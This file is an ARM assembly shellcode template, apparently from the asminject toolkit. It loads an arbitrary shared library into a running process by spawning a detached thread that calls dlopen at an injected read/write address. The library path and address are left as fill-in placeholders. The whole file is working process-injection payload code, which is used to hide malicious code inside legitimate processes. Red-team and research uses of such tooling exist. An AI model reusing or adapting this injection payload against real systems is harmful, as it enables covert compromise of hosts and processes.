# Threaded version of dlinject.s
# Same caveats as dlinject_threaded.s

[FRAGMENT:asminject_libc_or_libdl_dlopen.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]

b dlinject_threaded_main

load_dlinject_wrapper_address:
	mov r2, pc
	b call_pthread_create

load_library:
	// load the library path into r0
	mov r0, pc
	b call_dlopen

library_path:
	.ascii "[VARIABLE:librarypath:VARIABLE]\0"
	.balign 4

call_dlopen:
	push {r1}
	mov r1, #0x2@				@ mode (RTLD_NOW)
	bl asminject_libc_or_libdl_dlopen
	pop {r1}
	mov r0, #0x0	@ pthread_exit return value NULL
	bl asminject_libpthread_pthread_exit

call_pthread_create:
	bl asminject_libpthread_pthread_create
// detach the newly-created thread where the library has been loaded
	bl asminject_libpthread_pthread_detach
	
SHELLCODE_SECTION_DELIMITER

dlinject_threaded_main:
// load the arbitrary read/write address into r0
	ldr r0, [pc]
	b load_dlinject_wrapper_address

read_write_address:
	.word [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	.balign 4

